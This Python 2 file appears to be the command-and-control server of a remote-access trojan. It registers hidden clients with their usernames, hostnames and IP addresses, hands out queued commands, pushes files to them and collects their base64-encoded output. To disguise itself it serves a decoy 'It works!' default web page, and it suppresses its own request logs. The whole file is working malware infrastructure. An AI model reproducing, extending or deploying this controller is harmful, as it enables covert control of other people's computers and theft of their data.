"""Server which controls clients over the HTTPS protocol.

Provides only the communication layer, all other functionality is handled by modules.
"""
from __future__ import absolute_import
__author__ = "Marten4n6"
__license__ = "GPLv3"

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn
from ssl import SSLError
from .model import Client
from .server import MESSAGE_INFO, MESSAGE_ATTENTION
from urllib import unquote_plus
import os
import base64
import json
import time
import shutil


class ClientController(BaseHTTPRequestHandler):
    """This class handles HTTPS requests and responses."""
    _model = None
    _modules = None
    _output_view = None

    def send_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_POST(self):
        """Handles POST requests."""
        data = str(self.rfile.read(int(self.headers.getheader("Content-Length"))))

        if self.path == "/api/get_command":
            # Command requests
            username = data.split("&")[0].replace("username=", "", 1)
            path = unquote_plus(data.split("&")[1].replace("path=", "", 1))
            hostname = data.split("&")[2].replace("hostname=", "", 1)
            client_id = data.split("&")[3].replace("client_id=", "", 1)
            remote_ip = data.split("&")[4].replace("remote_ip=", "", 1)

            client = self._model.get_client(client_id)

            if not client:
                # This is the first time this client has connected.
                self._output_view.add(self._output_view.SEPARATOR)
                self._output_view.add("New client \"%s@%s\" connected!" % (username, hostname), "info")

                self._model.add_client(Client(client_id, username, hostname, remote_ip, path, time.time()))
                self.send_headers()
                self.wfile.write("You dun goofed.")
            else:
                # Update the client's session (path and last_online).
                self._model.update_client(client_id, path, time.time())

                # Send any pending commands to the client.
                command = self._model.get_command(client_id)

                if command:
                    self._model.remove_command(command.id)

                    # Special modules which need the server to do extra stuff.
                    if command.module_name in ["update_client", "remove_client"]:
                        self._model.remove_client(client_id)

                        self.send_headers()
                        self.wfile.write(str(command))
                    elif command.module_name == "upload":
                        file_path = base64.b64decode(command.command).split(":")[0].replace("\n", "")
                        file_name = os.path.basename(file_path)

                        self._output_view.add("Sending file to client...", "info")

                        with open(file_path, "rb") as input_file:
                            file_size = os.fstat(input_file.fileno())

                            self.send_response(200)
                            self.send_header("Content-Type", "application/octet-stream")
                            self.send_header("Content-Disposition", "attachment; filename=\"%s\"" % file_name)
                            self.send_header("Content-Length", str(file_size.st_size))
                            self.send_header("X-Upload-Module", command.command)
                            self.end_headers()

                            shutil.copyfileobj(input_file, self.wfile)
                    else:
                        self.send_headers()
                        self.wfile.write(str(command))
                else:
                    # Client has no pending commands.
                    self.send_headers()
                    self.wfile.write("")
        elif self.path == "/api/response":
            # Command responses
            json_response = json.loads(base64.b64decode(unquote_plus(data.replace("output=", "", 1))))
            response = base64.b64decode(json_response["response"])
            module_name = json_response["module_name"]

            self.send_headers()

            if module_name:
                # Send the response back to the module
                for name, module_imp in self._modules.get_modules().iteritems():
                    if name == module_name:
                        try:
                            module_imp.process_response(self._output_view, response)
                            break
                        except AttributeError:
                            # The module doesn't have a process_response method, that's fine.
                            self.output_response(response)
            else:
                # Command response
                self.output_response(response)

    def output_response(self, response):
        """Sends the response to the output view."""
        self._output_view.add(self._output_view.SEPARATOR)

        if "\n" in response:
            for line in response.split("\n"):
                if line.startswith(MESSAGE_INFO):
                    self._output_view.add(line.replace(MESSAGE_INFO, ""), "info")
                elif line.startswith(MESSAGE_ATTENTION):
                    self._output_view.add(line.replace(MESSAGE_ATTENTION, ""), "attention")
                else:
                    self._output_view.add(line)
        else:
            self._output_view.add(response)

    def do_GET(self):
        self.send_headers()

        if self.path == "/api/get_ca":
            # Send back our certificate authority.
            with open("server.cert") as input_file:
                self.wfile.write(base64.b64encode("".join(input_file.readlines())))
        else:
            # Show a standard looking page.
            page = """\
            <html><body><h1>It works!</h1>
            <p>This is the default web page for this server.</p>
            <p>The web server software is running but no content has been added, yet.</p>
            </body></html>
            """
            self.wfile.write(page)

    def handle(self):
        try:
            BaseHTTPRequestHandler.handle(self)
        except SSLError as ex:
            if "alert unknown ca" in str(ex):
                # See https://support.mozilla.org/en-US/kb/troubleshoot-SEC_ERROR_UNKNOWN_ISSUER
                self._output_view.add("Showing \"Your connection is not secure\" message to user.", "attention")
            else:
                self._output_view.add("Error: " + str(ex), "attention")

    def log_message(self, format, *args):
        return  # Don't log random stuff we don't care about, thanks.


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
    pass
